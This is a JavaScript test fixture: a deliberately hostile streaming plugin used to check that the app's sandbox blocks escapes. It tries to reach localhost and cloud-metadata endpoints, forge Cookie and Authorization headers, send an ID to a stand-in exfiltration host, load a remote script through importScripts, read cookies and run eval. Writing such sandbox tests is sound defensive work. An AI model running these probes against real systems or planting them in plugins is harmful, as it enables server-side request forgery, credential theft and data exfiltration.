// Fixture: a hostile plugin. Everything it tries must fail; what it saw is reported back as its "stream title".
module.exports.getStreams = async function (tmdbId) {
  const out = {};
  const attempt = async function (k, f) { try { out[k] = String(await f()).slice(0, 90); } catch (e) { out[k] = 'ERR ' + ((e && e.message) || e); } };
  await attempt('private', function () { return fetch('http://127.0.0.1:8787/api/auth/me').then(function (r) { return r.status; }); });
  await attempt('metadata', function () { return fetch('http://169.254.169.254/latest/meta-data/').then(function (r) { return r.status; }); });
  await attempt('own-site', function () { return fetch('https://www.liuyingapp.com/api/auth/me').then(function (r) { return r.status; }); });
  await attempt('port-22', function () { return fetch('https://api.fixture.dev:22/').then(function (r) { return r.status; }); });
  await attempt('put', function () { return fetch('https://api.fixture.dev/x', { method: 'PUT' }).then(function (r) { return r.status; }); });
  await attempt('cookie-header', async function () { const j = await (await fetch('https://api.fixture.dev/echo', { headers: { Cookie: 'a=b', Authorization: 'Bearer x', 'X-Forwarded-For': '9.9.9.9', 'X-Ok': 'yes' } })).json(); return JSON.stringify(j.seen); });
  await attempt('native-fetch', function () { return Object.getPrototypeOf(self).fetch ? Object.getPrototypeOf(self).fetch.call(self, 'https://exfil.fixture.dev/leak?x=' + tmdbId).then(function (r) { return r.status; }) : 'no native fetch on the prototype'; });
  await attempt('xhr', function () { return typeof XMLHttpRequest; });
  await attempt('websocket', function () { return typeof WebSocket; });
  await attempt('importScripts', function () { return typeof importScripts; });
  await attempt('proto-importScripts', function () { return Object.getPrototypeOf(Object.getPrototypeOf(self)).importScripts ? (Object.getPrototypeOf(Object.getPrototypeOf(self)).importScripts.call(self, 'https://exfil.fixture.dev/x.js'), 'LOADED') : 'none'; });
  await attempt('document', function () { return typeof document; });
  await attempt('window.top', function () { return typeof top + '/' + typeof parent + '/' + typeof opener; });
  await attempt('localStorage', function () { return typeof localStorage; });
  await attempt('indexedDB', function () { return typeof indexedDB; });
  await attempt('cookies', function () { return typeof document === 'undefined' ? 'no document' : document.cookie; });
  await attempt('origin', function () { return String(self.origin) + ' ' + String(self.location && self.location.protocol); });
  await attempt('postMessage', function () { return typeof postMessage; });
  await attempt('eval-works', function () { return (0, eval)('6*7'); });
  await attempt('webassembly', function () { return typeof WebAssembly; });
  return Object.keys(out).map(function (k) { return { name: 'Fixture Evil', title: k + '=' + out[k], url: 'https://cdn.fixture.dev/evil-' + encodeURIComponent(k) + '.mp4' }; });
};
